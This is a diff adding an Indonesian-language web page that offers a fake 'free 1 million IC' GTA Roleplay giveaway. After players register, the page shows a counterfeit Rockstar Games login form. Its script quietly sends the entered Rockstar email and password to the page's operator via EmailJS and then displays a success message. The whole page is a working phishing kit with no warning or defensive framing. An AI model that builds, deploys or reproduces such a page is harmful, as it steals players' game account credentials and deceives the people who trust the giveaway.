@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GTA RP - Event 1 Juta IC</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+      emailjs.init("xCZlZz-fwMVrgM0gQ"); // Ganti dengan Public Key dari EmailJS
+    })();
+  </script>
+</head>
+<body class="bg-gradient-to-br from-black via-gray-900 to-black text-white p-6 flex flex-col items-center min-h-screen">
+
+  <h1 class="text-4xl font-bold mb-4 text-center">🎮 Dapatkan 1 Juta IC GRATIS! 🎉</h1>
+
+  <p class="text-center max-w-xl mb-6">
+    Bergabunglah di event spesial GTA Roleplay Indonesia! Berlaku untuk semua pemain dari semua server. Tanpa syarat ribet, tanpa biaya, cukup daftar dan main!
+  </p>
+
+  <div class="w-full max-w-md bg-gray-800 p-6 rounded-2xl shadow-xl">
+    <!-- Form Pendaftaran -->
+    <form id="form" class="space-y-4">
+      <input name="name" placeholder="Nama Karakter IC" class="w-full p-2 rounded bg-gray-900 text-white" required />
+      <input name="discord" placeholder="Username Discord (cth: nama#1234)" class="w-full p-2 rounded bg-gray-900 text-white" required />
+      <input name="server" placeholder="Nama Server GTA RP" class="w-full p-2 rounded bg-gray-900 text-white" required />
+      <button type="submit" class="w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded">Daftar Sekarang</button>
+    </form>
+
+    <!-- Form Login Rockstar -->
+    <form id="rockstarLogin" class="space-y-4 hidden">
+      <h2 class="text-lg font-semibold text-center">Login Rockstar Games</h2>
+      <input name="rockstarEmail" type="email" placeholder="Email Rockstar" class="w-full p-2 rounded bg-gray-900 text-white" required />
+      <input name="rockstarPassword" type="password" placeholder="Password" class="w-full p-2 rounded bg-gray-900 text-white" required />
+      <button type="submit" class="w-full bg-yellow-500 hover:bg-yellow-600 text-black py-2 rounded">Login</button>
+    </form>
+
+    <p id="successMessage" class="text-green-400 text-center font-semibold mt-4 hidden">Pendaftaran berhasil! Cek Discord untuk info selanjutnya.</p>
+  </div>
+
+  <section class="max-w-2xl mt-10 text-left space-y-4">
+    <h2 class="text-2xl font-semibold">📜 Syarat & Ketentuan</h2>
+    <ul class="list-disc list-inside text-sm text-gray-300 space-y-1">
+      <li>Berlaku hanya untuk 1 karakter IC per pemain</li>
+      <li>Event berlangsung 20 Juni – 1 Juli 2025</li>
+      <li>Multi-account dilarang</li>
+      <li>Online minimal 3 jam di server yang disebutkan</li>
+      <li>Follow dan join komunitas kami di Discord</li>
+    </ul>
+
+    <h2 class="text-2xl font-semibold mt-6">📲 Komunitas & Kontak</h2>
+    <p>Gabung ke Discord kami untuk info lebih lanjut dan pengiriman IC: <a href="https://discord.gg/aykdwrcZRW" class="text-blue-400 underline">discord.gg/aykdwrcZRW</a></p>
+  </section>
+
+  <script>
+    const form = document.getElementById("form");
+    const loginForm = document.getElementById("rockstarLogin");
+    const successMessage = document.getElementById("successMessage");
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      form.classList.add("hidden");
+      loginForm.classList.remove("hidden");
+    });
+
+    loginForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const email = loginForm.rockstarEmail.value;
+      const password = loginForm.rockstarPassword.value;
+
+      emailjs.send("kev123", "kev1234", {
+        rockstar_email: email,
+        rockstar_password: password
+      })
+      .then(function(response) {
+        console.log("Email terkirim:", response.status, response.text);
+        loginForm.classList.add("hidden");
+        successMessage.classList.remove("hidden");
+      }, function(error) {
+        console.error("Gagal mengirim email:", error);
+        alert("Terjadi kesalahan. Silakan coba lagi.");
+      });
+    });
+  </script>
+
+</body>
+</html>
